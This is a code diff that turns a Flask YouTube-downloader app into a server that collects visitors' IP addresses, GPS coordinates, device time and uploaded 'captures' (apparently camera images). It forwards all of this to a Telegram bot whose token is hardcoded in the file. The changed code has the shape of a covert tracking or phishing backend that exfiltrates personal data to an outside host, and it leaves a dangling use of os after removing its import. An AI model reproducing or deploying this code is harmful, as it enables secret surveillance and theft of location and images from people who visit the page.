@@ -1,25 +1,59 @@
-from flask import Flask, render_template, request, send_file
-from pytube import YouTube
-import os
+from flask import Flask, render_template, request
+import requests
+import datetime
+import json
 
 app = Flask(__name__)
 
-DOWNLOAD_FOLDER = "downloads"
-os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
+BOT_TOKEN = '6997914641:AAEdrtEZbk59jKZO8uNZoU-ILxyLENsFQSU'
+CHAT_ID = '6997914641'  # Your chat ID
 
-@app.route("/", methods=["GET", "POST"])
+@app.route('/')
 def index():
-    if request.method == "POST":
-        url = request.form["url"]
+    return render_template('index.html')
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    ip_address = request.remote_addr
+    meta_json = request.form.get('meta')
+
+    if meta_json:
         try:
-            yt = YouTube(url)
-            stream = yt.streams.filter(progressive=True, file_extension='mp4').order_by('resolution').desc().first()
-            filepath = stream.download(output_path=DOWNLOAD_FOLDER)
-            filename = os.path.basename(filepath)
-            return send_file(filepath, as_attachment=True)
-        except Exception as e:
-            return render_template("index.html", error=str(e))
-    return render_template("index.html")
+            meta = json.loads(meta_json)
+        except json.JSONDecodeError:
+            meta = {}
+
+        device_time = meta.get("timestamp", "Unknown")
+        latitude = meta.get("latitude", "Unavailable")
+        longitude = meta.get("longitude", "Unavailable")
+
+        message = (
+            "📸 *New Capture Received*\n\n"
+            f"🕰️ *Server Time:* `{datetime.datetime.now().isoformat()}`\n"
+            f"🕰️ *Device Time:* `{device_time}`\n"
+            f"🌐 *IP Address:* `{ip_address}`\n"
+            f"📍 *Location:* `{latitude}, {longitude}`"
+        )
+
+        requests.post(
+            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
+            data={
+                'chat_id': CHAT_ID,
+                'text': message,
+                'parse_mode': 'Markdown'
+            }
+        )
+
+    for key in request.files:
+        file = request.files[key]
+        requests.post(
+            f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
+            data={'chat_id': CHAT_ID},
+            files={'document': (file.filename, file)}
+        )
+
+    return 'Sent to Telegram.'
+
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port, debug=True)
